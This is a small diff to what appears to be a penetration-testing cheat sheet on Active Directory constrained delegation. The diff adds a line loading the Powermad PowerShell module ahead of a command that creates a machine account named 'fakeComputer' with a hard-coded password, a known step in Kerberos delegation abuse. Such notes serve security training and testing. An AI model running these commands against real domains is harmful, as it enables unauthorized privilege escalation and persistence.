@@ -57,6 +57,7 @@ Constrained Delegation Requirements :
 #### Load powermad
 
 ```csharp
+. .\powermad.ps1
 New-MachineAccount -MachineAccount fakeComputer -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 ```
 
